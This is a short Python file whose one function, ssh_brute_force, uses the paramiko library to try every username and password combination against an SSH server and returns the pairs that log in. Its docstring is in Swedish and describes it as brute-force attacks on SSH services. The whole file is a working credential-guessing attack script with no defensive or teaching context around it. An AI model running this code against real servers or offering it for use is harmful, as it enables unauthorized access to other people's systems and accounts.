import paramiko

def ssh_brute_force(target, port, usernames, passwords):
    """
    Brute-force attacker mot SSH-tjänster.
    """
    success = []
    for username in usernames:
        for password in passwords:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target, port=port, username=username, password=password, timeout=5)
                success.append({"username": username, "password": password})
                client.close()
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                print(f"[!] Error: {e}")
    return success
